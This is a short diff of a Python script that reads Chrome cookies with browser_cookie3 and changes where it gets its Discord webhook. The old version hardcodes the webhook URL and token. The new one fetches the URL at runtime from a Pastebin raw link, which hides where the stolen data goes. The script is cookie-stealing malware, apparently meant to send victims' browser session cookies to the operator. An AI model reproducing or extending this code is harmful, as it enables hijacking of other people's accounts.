@@ -1,9 +1,10 @@
-# Enter your webhook below
-webhook = "https://discord.com/api/webhooks/867935142503653376/E3OlQqZbp3SfJgX9Vqm0ACWZOhIBqBaTsuf_HfkGmIEUt2ttObJZ32syP4JgRBibCbNp"
-
-
 import browser_cookie3
 import requests
+
+# Enter your pastebin below
+pastebinURL = "https://pastebin.com/raw/W3CUUpQX"
+
+webhook = requests.get(url=pastebinURL).text
 browserCookieList = browser_cookie3.chrome()
 stringCookieList = str(browserCookieList)
 splitted = stringCookieList.split(", ")
